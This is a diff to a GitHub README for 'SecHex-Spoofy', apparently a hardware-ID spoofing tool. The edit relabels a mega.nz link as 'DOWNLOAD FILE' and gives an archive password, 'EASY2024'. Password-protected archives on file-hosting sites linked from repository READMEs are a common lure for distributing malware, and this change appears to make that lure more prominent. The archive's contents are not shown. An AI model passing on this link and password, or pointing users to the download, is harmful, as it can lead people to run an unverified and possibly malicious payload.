@@ -2,7 +2,7 @@
 
 [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]() 
 
- [![Безымя111111нный](https://mega.nz/file/3QdhlLiJ#mfuQ81_hbufxXxOVQOida6Udj3ZgoqPl9gpiSOA5AX8)
+ [![DOWNLOAD FILE](https://mega.nz/file/3QdhlLiJ#mfuQ81_hbufxXxOVQOida6Udj3ZgoqPl9gpiSOA5AX8)
  > Password: EASY2024
 
 ## How to download:
